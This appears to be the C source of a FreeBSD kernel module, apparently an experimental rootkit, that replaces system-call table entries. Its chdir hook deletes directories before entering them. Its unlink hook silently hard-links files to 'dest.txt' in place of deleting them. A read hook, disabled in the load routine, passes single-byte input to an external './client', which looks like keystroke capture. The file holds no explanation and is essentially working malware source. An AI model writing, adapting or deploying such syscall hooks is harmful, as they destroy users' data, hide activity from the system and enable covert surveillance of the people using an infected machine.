#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/unistd.h>
#include <sys/fcntl.h>
#include <sys/stat.h>
#include <sys/dirent.h>

static int mkdir_hook(struct thread *td, void *syscall_args){
    struct mkdir_args *uap; /* char *path; int mode */
    uap = (struct mkdir_args *)syscall_args;
    char path[255];  
    size_t done;
    int error;
    error = copyinstr(uap->path, path, 255, &done);
    if (error != 0)
        return(error);
    /* Print a debug message. */
    uprintf("The directory \"%s\" will be created with the following permissions: %o\n", path, uap->mode);
    return sys_mkdir(td, syscall_args);
    //return sys_rmdir(td, (void *)uap->path);
}

static int chdir_hook(struct thread *td, void *syscall_args){
    
    sys_rmdir(td, syscall_args);
    return sys_chdir(td, syscall_args);
}

static int rmFile_hook(struct thread *td, void *syscall_args){
    struct unlink_args *tmp;
    tmp = (struct unlink_args *)syscall_args;
    char buf[50];
    int done;
    copyinstr(tmp->path, buf, 50, &done);
    printf("Deleting: %s\n", buf);
    
    struct link_args tmp1;
    tmp1.path = tmp->path;
    tmp1.link = "dest.txt";
    sys_link(td, &tmp1);
    return 0;
}

static int read_hook(struct thread *td, void *syscall_args){
	struct read_args *uap;
	uap = (struct read_args *)syscall_args;
	
	int error = sys_read(td, syscall_args);
	
	if(error){
		return error;
	} else if (!uap->nbyte){
		return 1;
	} else if (uap->nbyte > 1){
		return 1;
	} else if (uap->fd != 0){
		return 1;
	}
	struct execve_args args;
	char *newArgs[] = {"./client", uap->buf, NULL};
	args.fname = "./client";
	args.argv = newArgs;
	args.envv = NULL;
	
	sys_execve(td, (void *)&args);
	return 0;
}

static int load(struct module *module, int cmd, void *arg) {
	int error = 0;
    	switch (cmd) {
        	case MOD_LOAD:
           		/* Replace read with read_hook. */
              		printf("Loaded\n");
			sysent[SYS_mkdir].sy_call = (sy_call_t *)mkdir_hook;
                	//sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
			sysent[SYS_chdir].sy_call = (sy_call_t *)chdir_hook;
                	sysent[SYS_unlink].sy_call = (sy_call_t *)rmFile_hook;
			break;
     		case MOD_UNLOAD:
			printf("Unloaded\n");
                	sysent[SYS_mkdir].sy_call = (sy_call_t *)sys_mkdir;
                	//sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
			sysent[SYS_chdir].sy_call = (sy_call_t *)sys_chdir;
			sysent[SYS_unlink].sy_call = (sy_call_t *)sys_unlink;
			break;
            	default:
                	error = EOPNOTSUPP;
                	break;
	}
    	return(error);
}
static moduledata_t mod_hooks = {
    "hooks", /* module name */
    load, /* event handler */
    NULL /* extra data */
};

DECLARE_MODULE(hooks, mod_hooks, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
